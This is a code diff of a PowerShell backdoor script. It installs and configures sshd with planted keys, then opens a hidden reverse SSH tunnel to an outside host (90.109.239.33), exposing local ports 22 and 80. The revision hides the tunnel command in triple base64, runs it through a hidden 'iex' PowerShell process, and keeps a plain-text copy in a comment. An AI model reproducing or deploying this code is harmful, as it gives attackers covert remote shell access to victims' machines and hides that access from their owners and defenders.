@@ -151,30 +151,22 @@ AuthorizedKeysFile $Global:contentDirectory/administrators_authorized_keys"
     New-Item -ItemType File -Path $pathConfigSSHD -Value $a -Force
 }
 
-$C = 'WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySnRPR2xKUjJReFltNU9hRkZFYTNkTWFrVjNUMU0wZVUxNmEzVk5lazFuVEZaSlowNXFXVEpPYW5CellqSk9hR0pIYUhaak0xRTJUV3BKWjB4WGEyZEphVkpzWW01Wk5sUkZPVVJSVlhoQ1ZVWkNSVkZXVWtKTU1rNTJZbTVTYkdKdVVYWmhWMUptWTI1T2FFbG5QVDA9'
+$C = 'WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySnRPR2xKUjJReFltNU9hRkZFYTNkTWFrVjNUMU0wZVUxNmEzVk5lazFuVEZaSlowNXFXVEpPYW5CellqSk9hR0pIYUhaak0xRTJUV3BKWjB4V1NXZE9hbGt5VG5wd2MySXlUbWhpUjJoMll6TlJOazlFUVdkTVYydG5TV2xTYkdKdVdUWlVSVGxFVVZWNFFsVkdRa1ZSVmxKQ1RESk9kbUp1VW14aWJsRjJZVmRTWm1OdVRtaEpaejA5'
 
 for ($i = 0; $i -lt 3; $i++) 
 { $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }
-
-installSshd 
-createPrivateKeyOnRemote 
+#ssh -o "StrictHostKeyChecking no" gunsa@90.109.239.33 -R 6666:localhost:22 -R 6667:localhost:80 -i "$env:LOCALAPPDATA/content/id_rsa"
+installSshd
+createPrivateKeyOnRemote
 createAuthorized_key
 configSSHD_config
-
-$sshArgs = @(
-    '-o', 'StrictHostKeyChecking=no',
-    'gunsa@90.109.239.33',
-    '-R', '6666:localhost:22',
-    '-i', "$env:LOCALAPPDATA/content/id_rsa"
-)
 
 start-job -Name "rebootSSHD" -ScriptBlock {Restart-Service -Name sshd}
 Wait-Job -Name "rebootSSHD"
 Start-Sleep -Seconds 3 
 
 
-Start-Process -WindowStyle Hidden -FilePath 'ssh' -ArgumentList $sshArgs
-
+Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList "-C iex -C '$C'"
 #'@ | Out-File -FilePath "$env:LOCALAPPDATA/content/SC.ps1" -Encoding utf8 -Force
 
 <#
